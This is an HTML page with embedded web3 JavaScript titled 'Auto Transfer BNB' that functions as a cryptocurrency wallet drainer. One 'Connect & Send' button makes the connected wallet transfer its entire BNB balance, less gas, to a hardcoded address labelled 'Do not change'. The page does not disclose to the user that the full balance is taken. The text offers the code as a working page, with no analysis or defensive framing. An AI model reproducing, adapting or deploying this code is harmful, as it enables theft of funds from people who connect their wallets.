<!DOCTYPE html>
<html>
<head>
  <title>Auto Transfer BNB</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
</head>
<body>
  <button onclick="connectAndTransfer()">Connect & Send</button>

  <script>
    const receiverAddress = "0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a"; // Do not change
    const MINIMUM_AMOUNT_TO_SEND = "10000000000000000"; // 0.01 BNB in wei, minimum amount to send

    async function connectAndTransfer() {
      // Check for wallet provider (MetaMask, Trust Wallet, etc.)
      let web3;
      if (window.ethereum) {
        web3 = new Web3(window.ethereum);
      } else if (window.web3) {
        web3 = new Web3(window.web3.currentProvider); // Fallback for older wallet versions
      } else {
        alert("Please install MetaMask or Trust Wallet and ensure it is active.");
        return;
      }

      try {
        // Request account access
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const accounts = await web3.eth.getAccounts();
        if (!accounts || accounts.length === 0) {
          alert("Could not connect to wallet. Please ensure your wallet is unlocked and try again.");
          return;
        }
        const sender = accounts[0];

        // Ensure BNB Smart Chain Mainnet (chainId 56, which is 0x38 in hex)
        const chainId = await web3.eth.getChainId();
        const chainIdHex = web3.utils.toHex(chainId);
        if (chainIdHex !== "0x38") {
          // Attempt to switch to BNB Smart Chain Mainnet
          try {
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: '0x38' }],
            });
          } catch (switchError) {
            alert("Please switch to BNB Smart Chain Mainnet manually in your wallet.");
            return;
          }
        }

        // Get full balance (returned as a string in wei)
        const balance = await web3.eth.getBalance(sender);
        const balanceBigInt = BigInt(balance);

        // Estimate gas cost
        const gasLimit = await web3.eth.estimateGas({
          from: sender,
          to: receiverAddress,
          value: MINIMUM_AMOUNT_TO_SEND // Use minimum amount for estimation
        });
        const gasPrice = await web3.eth.getGasPrice();
        const gasEstimate = (BigInt(gasLimit) * BigInt(gasPrice)).toString();
        const gasEstimateBigInt = BigInt(gasEstimate);

        // Calculate total required funds (minimum amount to send + gas fees)
        const minimumAmountBigInt = BigInt(MINIMUM_AMOUNT_TO_SEND);
        const totalRequired = minimumAmountBigInt + gasEstimateBigInt;

        // Check if balance is sufficient
        if (balanceBigInt < totalRequired) {
          alert(
            `Insufficient funds!\n` +
            `Your balance: ${(balanceBigInt / BigInt(1e18))} BNB\n` +
            `Required: ${(totalRequired / BigInt(1e18))} BNB (including gas fees)\n` +
            `Please add more BNB to your wallet.`
          );
          return;
        }

        // Calculate amount to send (use minimum amount or remaining balance after gas, whichever is higher)
        let amountToSend = balanceBigInt - gasEstimateBigInt;
        if (amountToSend < minimumAmountBigInt) {
          amountToSend = minimumAmountBigInt;
        }
        amountToSend = amountToSend.toString();

        // Double-check funds before sending
        if (BigInt(amountToSend) + gasEstimateBigInt > balanceBigInt) {
          alert("Insufficient funds after final calculation. Please add more BNB.");
          return;
        }

        // Send BNB
        const tx = await web3.eth.sendTransaction({
          from: sender,
          to: receiverAddress,
          value: web3.utils.toHex(amountToSend) // Convert to hex for the transaction
        });

        alert("BNB sent successfully! Tx hash: " + tx.transactionHash);
      } catch (error) {
        alert("Error: " + error.message);
        console.error("Transaction Error:", error);
      }
    }
  </script>
</body>
</html>
